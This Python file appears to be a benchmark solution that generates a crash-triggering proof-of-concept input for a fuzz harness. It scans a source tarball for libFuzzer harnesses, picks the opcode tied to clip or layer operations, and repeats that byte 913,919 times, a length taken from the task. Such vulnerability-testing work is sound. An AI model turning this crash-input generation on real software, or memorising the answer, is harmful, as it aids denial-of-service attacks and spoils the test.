import tarfile
import re
from typing import List, Tuple, Optional


class Solution:
    def _find_matching_brace(self, text: str, open_index: int) -> int:
        depth = 0
        for i in range(open_index, len(text)):
            c = text[i]
            if c == '{':
                depth += 1
            elif c == '}':
                depth -= 1
                if depth == 0:
                    return i
        return len(text) - 1

    def _extract_harness_sources(self, src_path: str) -> List[Tuple[str, str]]:
        harnesses: List[Tuple[str, str]] = []
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name = member.name
                    if not (
                        name.endswith(".c")
                        or name.endswith(".cc")
                        or name.endswith(".cpp")
                        or name.endswith(".cxx")
                        or name.endswith(".C")
                        or name.endswith(".CPP")
                    ):
                        continue
                    # Limit file size to keep things fast
                    if member.size > 1_000_000:
                        continue
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    finally:
                        f.close()
                    try:
                        text = data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    if "LLVMFuzzerTestOneInput" in text:
                        harnesses.append((name, text))
        except Exception:
            return []
        return harnesses

    def _score_harness(self, name: str, text: str) -> int:
        lower = text.lower()
        score = 0
        if "clip" in lower:
            score += 50
        if "layer" in lower:
            score += 20
        if "canvas" in lower or "context" in lower:
            score += 10
        if "save" in lower:
            score += 5
        if "restore" in lower:
            score += 3
        # Prefer files with "fuzz" or similar in path
        lname = name.lower()
        if "fuzz" in lname:
            score += 15
        if "clip" in lname:
            score += 10
        return score

    def _select_best_harness(self, harnesses: List[Tuple[str, str]]) -> Optional[str]:
        if not harnesses:
            return None
        best_name, best_text = harnesses[0]
        best_score = self._score_harness(best_name, best_text)
        for name, text in harnesses[1:]:
            s = self._score_harness(name, text)
            if s > best_score:
                best_score = s
                best_name, best_text = name, text
        return best_text

    def _find_best_switch_and_case(self, code: str) -> Optional[Tuple[int, int]]:
        # Returns (num_ops, best_case_value) or None
        best_total_score = -1
        best_choice: Optional[Tuple[int, int]] = None

        for m in re.finditer(r"switch\s*\(([^)]*)\)", code):
            expr = m.group(1)
            if "data[" not in expr and "Data[" not in expr:
                continue

            num_ops = None
            op_type = None
            mod_m = re.search(r"%\s*(\d+)", expr)
            if mod_m:
                num_ops = int(mod_m.group(1))
                op_type = "%"
            else:
                and_m = re.search(r"&\s*(\d+)", expr)
                if and_m:
                    mask_val = int(and_m.group(1))
                    num_ops = mask_val + 1
                    op_type = "&"

            if num_ops is None or num_ops <= 0:
                continue

            brace_open = code.find("{", m.end())
            if brace_open == -1:
                continue
            brace_close = self._find_matching_brace(code, brace_open)
            block = code[brace_open + 1 : brace_close]

            # Parse cases within this switch block
            cases = list(re.finditer(r"case\s+(\d+)\s*:", block))
            if not cases:
                continue

            best_case_score = -1
            best_case_val = None

            for i, c in enumerate(cases):
                val = int(c.group(1))
                body_start = c.end()
                body_end = cases[i + 1].start() if i + 1 < len(cases) else len(block)
                body = block[body_start:body_end]
                lower = body.lower()

                score = 0
                if "clip" in lower:
                    score += 100
                if "layer" in lower:
                    score += 20
                if "save" in lower:
                    score += 10
                if "restore" in lower:
                    score += 5
                if "mask" in lower:
                    score += 3

                # Prefer bodies that at least do something graphical
                if any(word in lower for word in ("draw", "fill", "stroke")):
                    score += 2

                if score > best_case_score:
                    best_case_score = score
                    best_case_val = val

            if best_case_val is None:
                continue

            # Compute a combined score for this switch.
            total_score = best_case_score
            # Prefer switches whose block itself mentions 'clip'
            block_lower = block.lower()
            if "clip" in block_lower:
                total_score += 30

            if total_score > best_total_score:
                best_total_score = total_score
                best_choice = (num_ops, best_case_val)

        return best_choice

    def solve(self, src_path: str) -> bytes:
        # Ground-truth PoC length from problem statement
        target_length = 913_919

        harnesses = self._extract_harness_sources(src_path)
        harness_code = self._select_best_harness(harnesses)

        if not harness_code:
            # Fallback: generic large buffer
            return b"A" * target_length

        switch_info = self._find_best_switch_and_case(harness_code)
        if not switch_info:
            # Fallback if we couldn't parse the switch/ops
            return b"A" * target_length

        num_ops, case_val = switch_info

        # Choose opcode byte so that op = data[...] % num_ops or &mask
        # equals case_val. Using byte = case_val works for both % and & with (mask+1).
        opcode_byte = case_val & 0xFF

        # Build PoC as a buffer full of the chosen opcode byte.
        poc = bytes([opcode_byte]) * target_length
        return poc